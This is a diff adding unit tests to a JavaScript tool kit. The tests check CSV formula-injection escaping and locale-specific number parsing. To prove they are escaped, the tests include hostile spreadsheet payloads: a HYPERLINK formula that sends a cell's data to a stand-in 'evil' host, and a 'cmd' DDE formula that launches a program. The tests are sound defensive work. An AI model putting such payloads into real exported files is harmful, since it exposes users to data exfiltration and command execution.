@@ -27,6 +27,31 @@ test('today is the date on the device clock, so a night shift after midnight log
   assert.deepEqual(plain(ToolKit.rangePreset('all')), { from: '', to: '' });
 });
 
+test('a CSV cell that a spreadsheet would run as a formula is kept as text', () => {
+  const { ToolKit } = load('en');
+  assert.equal(ToolKit.csvSafe('=HYPERLINK("http://evil/?"&A1,"click")'), '\'=HYPERLINK("http://evil/?"&A1,"click")');
+  assert.equal(ToolKit.csvSafe("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0");
+  assert.equal(ToolKit.csvSafe('@SUM(A1)'), "'@SUM(A1)");
+  assert.equal(ToolKit.csvSafe('-2+3'), "'-2+3");
+  assert.equal(ToolKit.csvSafe('\tnote'), "'\tnote");
+  // Numbers and ordinary text stay as they are.
+  assert.equal(ToolKit.csvSafe('-5'), '-5');
+  assert.equal(ToolKit.csvSafe('+12.5'), '+12.5');
+  assert.equal(ToolKit.csvSafe('-0,3%'), '-0,3%');
+  assert.equal(ToolKit.csvSafe('Crushed box'), 'Crushed box');
+  assert.equal(ToolKit.csvSafe(''), '');
+  // On the German and Albanian pages too (the decimal comma makes no difference).
+  assert.equal(load('sq').ToolKit.csvSafe('=1+1'), "'=1+1");
+});
+
+test('the units handled in a handover are read in the page\'s number format', () => {
+  // The English page writes 3,000; the German and Albanian pages write 3.000.
+  assert.equal(load('en').ToolKit.parseNumber('3,000'), 3000);
+  assert.equal(load('en').ToolKit.parseNumber('12,500'), 12500);
+  assert.equal(load('de').ToolKit.parseNumber('3.000'), 3000);
+  assert.equal(load('sq').ToolKit.parseNumber('12.500,5'), 12500.5);
+});
+
 test('a period keeps only the rows dated inside it', () => {
   const { ToolKit } = load();
   const rows = [{ date: '2026-09-01' }, { date: '2026-09-05' }, { date: '2026-09-09' }, { date: '' }];
